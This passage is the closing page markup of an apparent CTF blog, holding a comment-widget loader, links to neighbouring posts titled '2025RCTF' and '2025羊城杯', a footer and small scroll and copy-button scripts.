</span></span></code></pre></td></tr></table></div></div></section><div class=comments><script>const getTheme=window.localStorage&&window.localStorage.getItem("theme");let theme=getTheme==="dark"?"dark":"light",s=document.createElement("script");s.src="https://giscus.app/client.js",s.setAttribute("data-repo","Wh1teJ0ker/discussion"),s.setAttribute("data-repo-id","R_kgDOOTzcZA"),s.setAttribute("data-category","Announcements"),s.setAttribute("data-category-id","DIC_kwDOOTzcZM4CoxXV"),s.setAttribute("data-mapping","pathname"),s.setAttribute("data-strict","0"),s.setAttribute("data-reactions-enabled","1"),s.setAttribute("data-emit-metadata","0"),s.setAttribute("data-input-position","top"),s.setAttribute("data-theme",theme),s.setAttribute("data-lang","zh-CN"),s.setAttribute("data-loading","lazy"),s.setAttribute("crossorigin","anonymous"),s.setAttribute("async",""),document.querySelector("div.comments").innerHTML="",document.querySelector("div.comments").appendChild(s)</script></div><div class=paginator><a class=prev href=https://wh1tej0ker.github.io/post/2025rctf-2sxbu2.html><svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375c0-.69413-.075800000000001-1.3284-.2422-1.86588M3.77086 21.1546C1.9934 20.7777.973585 18.7264 1.08749 16.688c.17931-3.209.06972-7.25665-.08236-10.47293C.87809 3.52811 3.12891 1.16316 5.51029 1.25008c4.25565.15534 9.86671-.04779 13.28091-.24466 1.2952-.074686 2.0494.62843 2.4005 1.76245M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787c1.918 1.4143 1.9383 9.65123 1.7087 13.59293-2.0526 7.6586-10.5943 7.3054-16.4004 5.705M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608 21.2797 23.0494 11.3665 22.9511 6.5 22.0658M9.94496 9C9.28897 9.61644 7.63215 10.997 6.04814 11.7966 5.98257 11.8297 5.98456 11.9753 6.05061 12.0063c1.00435.4716 2.8788 1.9201 3.89435 2.9937M6.44444 11.9667C8.86549 12.0608 14 12 16 11" stroke="currentcolor" stroke-linecap="round"/></svg>
<span>2025RCTF</span></a>
<a class=next href=https://wh1tej0ker.github.io/post/2025yang-cheng-bei-14spwm.html><span>2025羊城杯</span><svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375c0-.69413-.075800000000001-1.3284-.2422-1.86588M3.77086 21.1546C1.9934 20.7777.973585 18.7264 1.08749 16.688c.17931-3.209.06972-7.25665-.08236-10.47293C.87809 3.52811 3.12891 1.16316 5.51029 1.25008c4.25565.15534 9.86671-.04779 13.28091-.24466 1.2952-.074686 2.0494.62843 2.4005 1.76245M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787c1.918 1.4143 1.9383 9.65123 1.7087 13.59293-2.0526 7.6586-10.5943 7.3054-16.4004 5.705M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608 21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966 16.0174 11.8297 16.0154 11.9753 15.9494 12.0063 14.945 12.4779 13.0706 13.9264 12.055 15m3.5006-3.0333C13.1345 12.0608 8 12 6 11" stroke="currentcolor" stroke-linecap="round"/></svg></a></div></article></div><footer class=footer><p>&copy; 2025 <a href=https://wh1tej0ker.github.io/>Wh1teJ0kerのBlog</a>
Powered by
<a href=https://gohugo.io/ rel=noopener target=_blank>Hugo️️</a>
<a href=https://github.com/guangzhengli/hugo-theme-ladder rel=noopener target=_blank>Ladder</a>
️</p></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-arrow-up"><line x1="12" y1="19" x2="12" y2="5"/><polyline points="5 12 12 5 19 12"/></svg>
</a><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.querySelectorAll("pre > code").forEach(e=>{const s=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="Copy";function n(){t.innerHTML="Copied",setTimeout(()=>{t.innerHTML="Copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),n();return}const s=document.createRange();s.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(s);try{document.execCommand("copy"),n()}catch{}o.removeRange(s)}),e.parentNode.appendChild(t)})</script></main></body><script src=/main.min.cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e.js integrity="sha512-z4PhNX7vuL3xVChQ1m2AB9Yg5AULVxXcg/SpIdNs6c5H0NE8XYXysP+DGNKHfuwvY7kxvUdBeoGlODJ6+SfaPg==" crossorigin=anonymous defer></script></html>